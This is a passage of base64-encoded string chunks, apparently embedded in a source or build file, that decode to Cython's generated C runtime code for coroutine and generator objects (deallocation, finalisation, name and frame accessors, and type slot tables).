c3RhdGUoJmdlbi0+Z2lfZXhjX3N0YXRlLCB2aXNpdCwgYXJnKTsKfQpzdGF0aWMgaW50IF9fUHl4X0Nvcm91dGluZV9jbGVhcihQeU9iamVjdCAqc2VsZikgewogICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSAoX19weXhfQ29yb3V0aW5lT2JqZWN0ICopIHNlbGY7CiAgICBQeV9DTEVBUihnZW4tPmNsb3N1cmUpOwogICAgUHlfQ0xFQVIoZ2VuLT5jbGFzc29iaik7CiAgICBfX1B5eF9Db3JvdXRpbmVfVW5kZWxlZ2F0ZShnZW4pOwogICAgX19QeXhfQ29yb3V0aW5lX0V4Y2VwdGlvbkNsZWFyKCZnZW4tPmdpX2V4Y19zdGF0ZSk7CiNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VECiAgICBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChzZWxmKSkgewogICAgICAgIFB5X0NMRUFSKCgoX19weXhfUHlBc3luY0dlbk9iamVjdCopZ2VuKS0+YWdfZmluYWxpemVyKTsKICAgIH0KI2VuZGlmCiAgICBQeV9DTEVBUihnZW4tPmdpX2NvZGUpOwogICAgUHlfQ0xFQVIoZ2VuLT5naV9mcmFtZSk7CiAgICBQeV9DTEVBUihnZW4tPmdpX25hbWUpOwogICAgUHlfQ0xFQVIoZ2VuLT5naV9xdWFsbmFtZSk7CiAgICBQeV9DTEVBUihnZW4tPmdpX21vZHVsZW5hbWUpOwogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIHZvaWQgX19QeXhfQ29yb3V0aW5lX2RlYWxsb2MoUHlPYmplY3QgKnNlbGYpIHsKICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqKSBzZWxmOwogICAgUHlPYmplY3RfR0NfVW5UcmFjayhnZW4pOwogICAgaWYgKGdlbi0+Z2lfd2Vha3JlZmxpc3QgIT0gTlVMTCkKICAgICAgICBQeU9iamVjdF9DbGVhcldlYWtSZWZzKHNlbGYpOwogICAgaWYgKGdlbi0+cmVzdW1lX2xhYmVsID49IDApIHsKICAgICAgICBQeU9iamVjdF9HQ19UcmFjayhzZWxmKTsKI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkUKICAgICAgICBpZiAodW5saWtlbHkoUHlPYmplY3RfQ2FsbEZpbmFsaXplckZyb21EZWFsbG9jKHNlbGYpKSkKI2Vsc2UKICAgICAgICB7CiAgICAgICAgICAgIGRl""c3RydWN0b3IgZGVsID0gX19QeXhfUHlPYmplY3RfR2V0U2xvdChnZW4sIHRwX2RlbCwgZGVzdHJ1Y3Rvcik7CiAgICAgICAgICAgIGlmIChkZWwpIGRlbChzZWxmKTsKICAgICAgICB9CiAgICAgICAgaWYgKHVubGlrZWx5KFB5X1JFRkNOVChzZWxmKSA+IDApKQojZW5kaWYKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgUHlPYmplY3RfR0NfVW5UcmFjayhzZWxmKTsKICAgIH0KI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRUQKICAgIGlmIChfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KHNlbGYpKSB7CiAgICAgICAgCiAgICAgICAgUHlfQ0xFQVIoKChfX3B5eF9QeUFzeW5jR2VuT2JqZWN0KilzZWxmKS0+YWdfZmluYWxpemVyKTsKICAgIH0KI2VuZGlmCiAgICBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoc2VsZik7CiAgICBfX1B5eF9QeUhlYXBUeXBlT2JqZWN0X0dDX0RlbChnZW4pOwp9CiNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFCnN0YXRpYyB2b2lkIF9fUHl4X0Nvcm91dGluZV9kZWwoUHlPYmplY3QgKnNlbGYpIHsKICAgIFB5T2JqZWN0ICplcnJvcl90eXBlLCAqZXJyb3JfdmFsdWUsICplcnJvcl90cmFjZWJhY2s7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKikgc2VsZjsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgaWYgKGdlbi0+cmVzdW1lX2xhYmVsIDwgMCkgewogICAgICAgIHJldHVybjsKICAgIH0KICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICBfX1B5eF9FcnJGZXRjaCgmZXJyb3JfdHlwZSwgJmVycm9yX3ZhbHVlLCAmZXJyb3JfdHJhY2ViYWNrKTsKI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRUQKICAgIGlmIChfX1B5eF9Bc3luY0dlbl9DaGVja0V4YWN0KHNlbGYpKSB7CiAgICAgICAgX19weXhfUHlBc3luY0dlbk9iamVjdCAqYWdlbiA9IChfX3B5eF9QeUFzeW5jR2VuT2JqZWN0KilzZWxmOwogICAgICAgIFB5T2JqZWN0ICpmaW5hbGl6ZXIgPSBhZ2VuLT5hZ19maW5hbGl6ZXI7CiAgICAgICAgaWYgKGZpbmFsaXplciAmJiAhYWdlbi0+YWdfY2xvc2VkKSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpyZXMgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKGZpbmFsaXplciwgc2VsZik7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghcmVzKSkgewogICAgICAgICAgICAgICAgUHlFcnJfV3JpdGVVbnJhaXNhYmxlKHNlbGYpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgUHlfREVDUkVGKHJlcyk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgX19QeXhfRXJyUmVzdG9yZShlcnJvcl90eXBlLCBlcnJvcl92YWx1ZSwgZXJyb3JfdHJhY2ViYWNrKTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgIH0KI2VuZGlmCiAgICBpZiAodW5saWtlbHkoZ2VuLT5yZXN1bWVfbGFiZWwgPT0gMCAmJiAhZXJyb3JfdmFsdWUpKSB7CiNpZmRlZiBfX1B5eF9Db3JvdXRp""bmVfVVNFRAojaWZkZWYgX19QeXhfR2VuZXJhdG9yX1VTRUQKICAgIGlmICghX19QeXhfR2VuZXJhdG9yX0NoZWNrRXhhY3Qoc2VsZikpCiNlbmRpZgogICAgICAgIHsKICAgICAgICBQeU9iamVjdF9HQ19VblRyYWNrKHNlbGYpOwogICAgICAgIGlmICh1bmxpa2VseShQeUVycl9XYXJuRm9ybWF0KFB5RXhjX1J1bnRpbWVXYXJuaW5nLCAxLCAiY29yb3V0aW5lICclLjUwUycgd2FzIG5ldmVyIGF3YWl0ZWQiLCBnZW4tPmdpX3F1YWxuYW1lKSA8IDApKQogICAgICAgICAgICBQeUVycl9Xcml0ZVVucmFpc2FibGUoc2VsZik7CiAgICAgICAgUHlPYmplY3RfR0NfVHJhY2soc2VsZik7CiAgICAgICAgfQojZW5kaWYKICAgIH0gZWxzZSB7CiAgICAgICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7CiAgICAgICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZShzZWxmLCAmcmV0dmFsKTsKICAgICAgICBpZiAocmVzdWx0ID09IFBZR0VOX0VSUk9SKSB7CiAgICAgICAgICAgIFB5RXJyX1dyaXRlVW5yYWlzYWJsZShzZWxmKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBQeV9YREVDUkVGKHJldHZhbCk7CiAgICAgICAgfQogICAgfQogICAgX19QeXhfRXJyUmVzdG9yZShlcnJvcl90eXBlLCBlcnJvcl92YWx1ZSwgZXJyb3JfdHJhY2ViYWNrKTsKfQojZW5kaWYKc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ29yb3V0aW5lX2dldF9uYW1lKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgdm9pZCAqY29udGV4dCkKewogICAgUHlPYmplY3QgKm5hbWUgPSBzZWxmLT5naV9uYW1lOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBpZiAodW5saWtlbHkoIW5hbWUpKSBuYW1lID0gUHlfTm9uZTsKICAgIFB5X0lOQ1JFRihuYW1lKTsKICAgIHJldHVybiBuYW1lOwp9CnN0YXRpYyBpbnQKX19QeXhfQ29yb3V0aW5lX3NldF9uYW1lKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KQp7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSBOVUxMIHx8ICFQeVVuaWNvZGVfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX25hbWVfXyBtdXN0IGJlIHNldCB0byBhIHN0cmluZyBvYmplY3QiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgX19QeXhfUHlfWERFQ1JFRl9TRVQoc2VsZi0+Z2lfbmFtZSwgdmFsdWUpOwogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ29yb3V0aW5lX2dldF9xdWFsbmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYsIHZvaWQgKmNvbnRleHQpCnsKICAgIFB5T2JqZWN0ICpuYW1lID0gc2VsZi0+Z2lfcXVhbG5hbWU7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsK""ICAgIGlmICh1bmxpa2VseSghbmFtZSkpIG5hbWUgPSBQeV9Ob25lOwogICAgUHlfSU5DUkVGKG5hbWUpOwogICAgcmV0dXJuIG5hbWU7Cn0Kc3RhdGljIGludApfX1B5eF9Db3JvdXRpbmVfc2V0X3F1YWxuYW1lKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KQp7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSBOVUxMIHx8ICFQeVVuaWNvZGVfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX3F1YWxuYW1lX18gbXVzdCBiZSBzZXQgdG8gYSBzdHJpbmcgb2JqZWN0Iik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKHNlbGYtPmdpX3F1YWxuYW1lLCB2YWx1ZSk7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9fQ29yb3V0aW5lX2dldF9mcmFtZShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKnNlbGYpCnsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeU9iamVjdCAqZnJhbWU7CiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICAgUHlfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihzZWxmKTsKICAgICNlbmRpZgogICAgZnJhbWUgPSBzZWxmLT5naV9mcmFtZTsKICAgIGlmICghZnJhbWUpIHsKICAgICAgICBpZiAodW5saWtlbHkoIXNlbGYtPmdpX2NvZGUpKSB7CiAgICAgICAgICAgIFB5X1JFVFVSTl9OT05FOwogICAgICAgIH0KICAgICAgICBQeU9iamVjdCAqZ2xvYmFscyA9IFB5RGljdF9OZXcoKTsKICAgICAgICBpZiAodW5saWtlbHkoIWdsb2JhbHMpKSByZXR1cm4gTlVMTDsKICAgICAgICBmcmFtZSA9IChQeU9iamVjdCAqKSBQeUZyYW1lX05ldygKICAgICAgICAgICAgUHlUaHJlYWRTdGF0ZV9HZXQoKSwgICAgICAgICAgICAKICAgICAgICAgICAgKFB5Q29kZU9iamVjdCopIHNlbGYtPmdpX2NvZGUsICAKICAgICAgICAgICAgZ2xvYmFscywgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICApOwogICAgICAgIFB5X0RFQ1JFRihnbG9iYWxzKTsKICAgICAgICBpZiAodW5saWtlbHkoIWZyYW1lKSkKICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgaWYgKHVubGlrZWx5KHNlbGYtPmdpX2ZyYW1lKSkgewogICAgICAgICAgICBQeV9ERUNSRUYoZnJhbWUpOwogICAgICAgICAgICBmcmFtZSA9IHNlbGYtPmdpX2ZyYW1lOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHNlbGYtPmdpX2ZyYW1lID0gZnJhbWU7CiAgICAgICAgfQogICAgfQogICAgUHlfSU5DUkVGKGZyYW1lKTsKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwCiAgICBQeV9FTkRfQ1JJ""VElDQUxfU0VDVElPTigpOwogICAgI2VuZGlmCiAgICByZXR1cm4gZnJhbWU7CiNlbHNlCiAgICBDWVRIT05fVU5VU0VEX1ZBUihzZWxmKTsKICAgIFB5X1JFVFVSTl9OT05FOwojZW5kaWYKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9Db3JvdXRpbmVfZ2V0X2ZyYW1lKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgdm9pZCAqY29udGV4dCkgewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBQeU9iamVjdCAqZnJhbWUgPSBzZWxmLT5naV9mcmFtZTsKICAgIGlmIChmcmFtZSkKICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKGZyYW1lKTsKICAgIHJldHVybiBfX1B5eF9fQ29yb3V0aW5lX2dldF9mcmFtZShzZWxmKTsKfQpzdGF0aWMgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX1B5eF9fQ29yb3V0aW5lX05ldygKICAgICAgICAgICAgUHlUeXBlT2JqZWN0KiB0eXBlLCBfX3B5eF9jb3JvdXRpbmVfYm9keV90IGJvZHksIFB5T2JqZWN0ICpjb2RlLCBQeU9iamVjdCAqY2xvc3VyZSwKICAgICAgICAgICAgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpxdWFsbmFtZSwgUHlPYmplY3QgKm1vZHVsZV9uYW1lKSB7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IFB5T2JqZWN0X0dDX05ldyhfX3B5eF9Db3JvdXRpbmVPYmplY3QsIHR5cGUpOwogICAgaWYgKHVubGlrZWx5KCFnZW4pKQogICAgICAgIHJldHVybiBOVUxMOwogICAgcmV0dXJuIF9fUHl4X19Db3JvdXRpbmVfTmV3SW5pdChnZW4sIGJvZHksIGNvZGUsIGNsb3N1cmUsIG5hbWUsIHF1YWxuYW1lLCBtb2R1bGVfbmFtZSk7Cn0Kc3RhdGljIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9OZXdJbml0KAogICAgICAgICAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiwgX19weXhfY29yb3V0aW5lX2JvZHlfdCBib2R5LCBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmNsb3N1cmUsCiAgICAgICAgICAgIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcXVhbG5hbWUsIFB5T2JqZWN0ICptb2R1bGVfbmFtZSkgewogICAgZ2VuLT5ib2R5ID0gYm9keTsKICAgIGdlbi0+Y2xvc3VyZSA9IGNsb3N1cmU7CiAgICBQeV9YSU5DUkVGKGNsb3N1cmUpOwogICAgZ2VuLT5pc19ydW5uaW5nID0gMDsKICAgIGdlbi0+cmVzdW1lX2xhYmVsID0gMDsKICAgIGdlbi0+Y2xhc3NvYmogPSBOVUxMOwogICAgZ2VuLT55aWVsZGZyb20gPSBOVUxMOwogICAgZ2VuLT55aWVsZGZyb21fYW1fc2VuZCA9IE5VTEw7CiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgZ2VuLT5naV9leGNfc3RhdGUuZXhjX3ZhbHVlID0gTlVMTDsKICAgICNlbHNlCiAgICBnZW4tPmdpX2V4Y19zdGF0ZS5leGNfdHlwZSA9IE5VTEw7CiAgICBnZW4tPmdpX2V4Y19zdGF0ZS5leGNfdmFsdWUgPSBOVUxMOwogICAgZ2VuLT5naV9leGNfc3RhdGUuZXhjX3RyYWNlYmFjayA9IE5VTEw7""CiAgICAjZW5kaWYKI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sKICAgIGdlbi0+Z2lfZXhjX3N0YXRlLnByZXZpb3VzX2l0ZW0gPSBOVUxMOwojZW5kaWYKICAgIGdlbi0+Z2lfd2Vha3JlZmxpc3QgPSBOVUxMOwogICAgUHlfWElOQ1JFRihxdWFsbmFtZSk7CiAgICBnZW4tPmdpX3F1YWxuYW1lID0gcXVhbG5hbWU7CiAgICBQeV9YSU5DUkVGKG5hbWUpOwogICAgZ2VuLT5naV9uYW1lID0gbmFtZTsKICAgIFB5X1hJTkNSRUYobW9kdWxlX25hbWUpOwogICAgZ2VuLT5naV9tb2R1bGVuYW1lID0gbW9kdWxlX25hbWU7CiAgICBQeV9YSU5DUkVGKGNvZGUpOwogICAgZ2VuLT5naV9jb2RlID0gY29kZTsKICAgIGdlbi0+Z2lfZnJhbWUgPSBOVUxMOwogICAgUHlPYmplY3RfR0NfVHJhY2soZ2VuKTsKICAgIHJldHVybiBnZW47Cn0Kc3RhdGljIGNoYXIgX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKSB7CiAgICBjaGFyIHJlc3VsdDsKICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeV9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKGdlbik7CiAgICAjZW5kaWYKICAgIHJlc3VsdCA9IGdlbi0+aXNfcnVubmluZzsKICAgIGdlbi0+aXNfcnVubmluZyA9IDE7CiAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgICNlbmRpZgogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgdm9pZCBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbikgewogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oZ2VuKTsKICAgICNlbmRpZgogICAgYXNzZXJ0KGdlbi0+aXNfcnVubmluZyk7CiAgICBnZW4tPmlzX3J1bm5pbmcgPSAwOwogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICAjZW5kaWYKfQpzdGF0aWMgY2hhciBfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pIHsKICAgIGNoYXIgcmVzdWx0OwogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oZ2VuKTsKICAgICNlbmRpZgogICAgcmVzdWx0ID0gZ2VuLT5pc19ydW5uaW5nOwogICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRF""RF9BUEkKICAgIFB5X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICAjZW5kaWYKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmdfZ2V0dGVyKFB5T2JqZWN0ICpnZW4sIHZvaWQgKmNsb3N1cmUpIHsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNsb3N1cmUpOwogICAgY2hhciByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoKF9fcHl4X0Nvcm91dGluZU9iamVjdCopZ2VuKTsKICAgIGlmIChyZXN1bHQpIFB5X1JFVFVSTl9UUlVFOwogICAgZWxzZSBQeV9SRVRVUk5fRkFMU0U7Cn0KI2lmIF9fUFlYX0hBU19QWV9BTV9TRU5EID09IDIKc3RhdGljIHZvaWQgX19QeXhfU2V0QmFja3BvcnRUeXBlQW1TZW5kKFB5VHlwZU9iamVjdCAqdHlwZSwgX19QeXhfUHlBc3luY01ldGhvZHNTdHJ1Y3QgKnN0YXRpY19hbXNlbmRfbWV0aG9kcywgX19QeXhfcHlpdGVyX3NlbmRmdW5jIGFtX3NlbmQpIHsKICAgIFB5X3NzaXplX3QgcHRyX29mZnNldCA9IChjaGFyKikodHlwZS0+dHBfYXNfYXN5bmMpIC0gKGNoYXIqKXR5cGU7CiAgICBpZiAocHRyX29mZnNldCA8IDAgfHwgcHRyX29mZnNldCA+IHR5cGUtPnRwX2Jhc2ljc2l6ZSkgewogICAgICAgIHJldHVybjsKICAgIH0KICAgIG1lbWNweSgodm9pZCopc3RhdGljX2Ftc2VuZF9tZXRob2RzLCAodm9pZCopKHR5cGUtPnRwX2FzX2FzeW5jKSwgc2l6ZW9mKCp0eXBlLT50cF9hc19hc3luYykpOwogICAgc3RhdGljX2Ftc2VuZF9tZXRob2RzLT5hbV9zZW5kID0gYW1fc2VuZDsKICAgIHR5cGUtPnRwX2FzX2FzeW5jID0gX19QeXhfU2xvdFRwQXNBc3luYyhzdGF0aWNfYW1zZW5kX21ldGhvZHMpOwp9CiNlbmRpZgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9mYWlsX3JlZHVjZV9leChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKmFyZykgewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoYXJnKTsKICAgIF9fUHl4X1R5cGVOYW1lIHNlbGZfdHlwZV9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeV9UWVBFKChQeU9iamVjdCopc2VsZikpOwogICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwgImNhbm5vdCBwaWNrbGUgJyIgX19QeXhfRk1UX1RZUEVOQU1FICInIG9iamVjdCIsCiAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmX3R5cGVfbmFtZSk7CiAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUoc2VsZl90eXBlX25hbWUpOwogICAgcmV0dXJuIE5VTEw7Cn0KCgpzdGF0aWMgUHlNZXRob2REZWYgX19weXhfR2VuZXJhdG9yX21ldGhvZHNbXSA9IHsKICAgIHsic2VuZCIsIChQeUNGdW5jdGlvbikgX19QeXhfQ29yb3V0aW5lX1NlbmQsIE1FVEhfTywKICAgICBQeURvY19TVFIoInNlbmQoYXJnKSAtPiBzZW5kICdhcmcnIGludG8gZ2VuZXJhdG9yLFxucmV0dXJuIG5leHQgeWllbGRlZCB2YWx1ZSBvciByYWlzZSBTdG9wSXRlcmF0aW9uLiIpfSwKICAgIHsidGhyb3ci""LCAoUHlDRnVuY3Rpb24pIF9fUHl4X0Nvcm91dGluZV9UaHJvdywgTUVUSF9WQVJBUkdTLAogICAgIFB5RG9jX1NUUigidGhyb3codHlwWyx2YWxbLHRiXV0pIC0+IHJhaXNlIGV4Y2VwdGlvbiBpbiBnZW5lcmF0b3IsXG5yZXR1cm4gbmV4dCB5aWVsZGVkIHZhbHVlIG9yIHJhaXNlIFN0b3BJdGVyYXRpb24uIil9LAogICAgeyJjbG9zZSIsIChQeUNGdW5jdGlvbikgX19QeXhfQ29yb3V0aW5lX0Nsb3NlX01ldGhvZCwgTUVUSF9OT0FSR1MsCiAgICAgUHlEb2NfU1RSKCJjbG9zZSgpIC0+IHJhaXNlIEdlbmVyYXRvckV4aXQgaW5zaWRlIGdlbmVyYXRvci4iKX0sCiAgICB7Il9fcmVkdWNlX2V4X18iLCAoUHlDRnVuY3Rpb24pIF9fUHl4X0Nvcm91dGluZV9mYWlsX3JlZHVjZV9leCwgTUVUSF9PLCAwfSwKICAgIHsiX19yZWR1Y2VfXyIsIChQeUNGdW5jdGlvbikgX19QeXhfQ29yb3V0aW5lX2ZhaWxfcmVkdWNlX2V4LCBNRVRIX05PQVJHUywgMH0sCiAgICB7MCwgMCwgMCwgMH0KfTsKc3RhdGljIFB5TWVtYmVyRGVmIF9fcHl4X0dlbmVyYXRvcl9tZW1iZXJsaXN0W10gPSB7CiAgICB7ImdpX3lpZWxkZnJvbSIsIFRfT0JKRUNULCBvZmZzZXRvZihfX3B5eF9Db3JvdXRpbmVPYmplY3QsIHlpZWxkZnJvbSksIFJFQURPTkxZLAogICAgIFB5RG9jX1NUUigib2JqZWN0IGJlaW5nIGl0ZXJhdGVkIGJ5ICd5aWVsZCBmcm9tJywgb3IgTm9uZSIpfSwKICAgIHsiZ2lfY29kZSIsIFRfT0JKRUNULCBvZmZzZXRvZihfX3B5eF9Db3JvdXRpbmVPYmplY3QsIGdpX2NvZGUpLCBSRUFET05MWSwgTlVMTH0sCiAgICB7Il9fbW9kdWxlX18iLCBUX09CSkVDVCwgb2Zmc2V0b2YoX19weXhfQ29yb3V0aW5lT2JqZWN0LCBnaV9tb2R1bGVuYW1lKSwgMCwgMH0sCiAgICB7Il9fd2Vha2xpc3RvZmZzZXRfXyIsIFRfUFlTU0laRVQsIG9mZnNldG9mKF9fcHl4X0Nvcm91dGluZU9iamVjdCwgZ2lfd2Vha3JlZmxpc3QpLCBSRUFET05MWSwgMH0sCiAgICB7MCwgMCwgMCwgMCwgMH0KfTsKc3RhdGljIFB5R2V0U2V0RGVmIF9fcHl4X0dlbmVyYXRvcl9nZXRzZXRzW10gPSB7CiAgICB7Il9fbmFtZV9fIiwgKGdldHRlcilfX1B5eF9Db3JvdXRpbmVfZ2V0X25hbWUsIChzZXR0ZXIpX19QeXhfQ29yb3V0aW5lX3NldF9uYW1lLAogICAgIFB5RG9jX1NUUigibmFtZSBvZiB0aGUgZ2VuZXJhdG9yIiksIDB9LAogICAgeyJfX3F1YWxuYW1lX18iLCAoZ2V0dGVyKV9fUHl4X0Nvcm91dGluZV9nZXRfcXVhbG5hbWUsIChzZXR0ZXIpX19QeXhfQ29yb3V0aW5lX3NldF9xdWFsbmFtZSwKICAgICBQeURvY19TVFIoInF1YWxpZmllZCBuYW1lIG9mIHRoZSBnZW5lcmF0b3IiKSwgMH0sCiAgICB7ImdpX2ZyYW1lIiwgKGdldHRlcilfX1B5eF9Db3JvdXRpbmVfZ2V0X2ZyYW1lLCBOVUxMLAogICAgIFB5RG9jX1NUUigiRnJhbWUgb2YgdGhlIGdlbmVyYXRvciIpLCAwfSwKICAgIHsiZ2lfcnVubmluZyIsIF9fUHl4X0Nvcm91dGluZV9nZXRfaXNfcnVubmluZ19nZXR0ZXIsIE5VTEwsIE5V""TEwsIE5VTEx9LAogICAgezAsIDAsIDAsIDAsIDB9Cn07CnN0YXRpYyBQeVR5cGVfU2xvdCBfX3B5eF9HZW5lcmF0b3JUeXBlX3Nsb3RzW10gPSB7CiAgICB7UHlfdHBfZGVhbGxvYywgKHZvaWQgKilfX1B5eF9Db3JvdXRpbmVfZGVhbGxvY30sCiAgICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19QeXhfQ29yb3V0aW5lX3RyYXZlcnNlfSwKICAgIHtQeV90cF9pdGVyLCAodm9pZCAqKVB5T2JqZWN0X1NlbGZJdGVyfSwKICAgIHtQeV90cF9pdGVybmV4dCwgKHZvaWQgKilfX1B5eF9HZW5lcmF0b3JfTmV4dH0sCiAgICB7UHlfdHBfbWV0aG9kcywgKHZvaWQgKilfX3B5eF9HZW5lcmF0b3JfbWV0aG9kc30sCiAgICB7UHlfdHBfbWVtYmVycywgKHZvaWQgKilfX3B5eF9HZW5lcmF0b3JfbWVtYmVybGlzdH0sCiAgICB7UHlfdHBfZ2V0c2V0LCAodm9pZCAqKV9fcHl4X0dlbmVyYXRvcl9nZXRzZXRzfSwKICAgIHtQeV90cF9nZXRhdHRybywgKHZvaWQgKikg